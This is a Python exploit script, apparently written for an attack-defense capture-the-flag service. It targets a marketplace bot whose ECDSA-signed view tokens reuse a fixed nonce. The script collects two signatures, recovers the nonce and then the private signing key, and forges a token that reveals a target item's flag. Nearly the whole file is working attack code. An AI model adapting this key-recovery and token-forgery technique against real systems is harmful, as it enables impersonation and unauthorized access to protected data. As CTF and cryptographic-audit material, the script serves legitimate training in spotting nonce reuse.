#!/usr/bin/env python3

import sys
import random
import string
import struct

from ecdsa import SigningKey
from ecdsa.curves import NIST256p
from ecdsa.numbertheory import inverse_mod
from hashlib import sha256
from typing import Tuple

from bot_client import BotClient
from client import Client, User
from protocol import SIGNATURE_SIZE


SERVICE_PORT = 10050

BOT_USERNAME = 'marketbot'

USERNAME_LENGTH = 12
PASSWORD_LENGTH = 16


def randstr(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


def randuser() -> User:
    username = randstr(USERNAME_LENGTH)
    password = randstr(PASSWORD_LENGTH)
    return User(username, password)


def randuser_auth(client: Client) -> User:
    user = randuser()
    client.user = user
    client.register(exist_ok=True)
    client.auth()
    return user


def decode_view_token(token: str) -> Tuple[bytes, int, int]:
    bs = bytes.fromhex(token)
    data, sig = bs[:-SIGNATURE_SIZE], bs[-SIGNATURE_SIZE:]
    r = int.from_bytes(sig[:SIGNATURE_SIZE//2], 'big')
    s = int.from_bytes(sig[SIGNATURE_SIZE//2:], 'big')
    return data, r, s


def recover_nonce(data1: bytes, s1: int, data2: bytes, s2: int) -> int:
    z1 = int.from_bytes(sha256(data1).digest(), 'big')
    z2 = int.from_bytes(sha256(data2).digest(), 'big')
    k = (z1 - z2) * inverse_mod(s1 - s2, NIST256p.order) % NIST256p.order
    return k


def recover_privkey(data: bytes, r: int, s: int, k: int) -> Tuple[int, SigningKey]:
    z = int.from_bytes(sha256(data).digest(), 'big')
    d = (s * k - z) * inverse_mod(r, NIST256p.order) % NIST256p.order
    sk = SigningKey.from_secret_exponent(d, curve=NIST256p, hashfunc=sha256)
    return d, sk


def make_view_token(item_id: int, sk: SigningKey) -> str:
    data = struct.pack('<Q', item_id)
    sig = sk.sign(data)
    token = (data + sig).hex()
    return token


def exploit(client: Client, flagid: str):
    assert flagid.startswith('item:')
    item_id = int(flagid[len('item:'):])

    randuser_auth(client)

    bot_uid = client.get_userid(BOT_USERNAME)
    bot = BotClient(client, bot_uid)

    currency = client.mint(0)
    _, token1 = bot.sell(0, currency, 'foobar')
    _, token2 = bot.sell(0, currency, 'foobar')

    # BUG: view tokens use a fixed nonce for ECDSA signatures, recover privkey
    data1, r1, s1 = decode_view_token(token1)
    data2, _, s2 = decode_view_token(token2)
    k = recover_nonce(data1, s1, data2, s2)
    print(f'k = 0x{k:x}', file=sys.stderr)
    d, sk = recover_privkey(data1, r1, s1, k)
    print(f'd = 0x{d:x}', file=sys.stderr)

    token = make_view_token(item_id, sk)
    flag = bot.view(token)

    print(flag)


def main():
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <host> <flag ID>', file=sys.stderr)
        exit(1)

    host, flagid = sys.argv[1:]

    client = Client()
    client.connect(host, SERVICE_PORT)

    exploit(client, flagid)


if __name__ == '__main__':
    main()
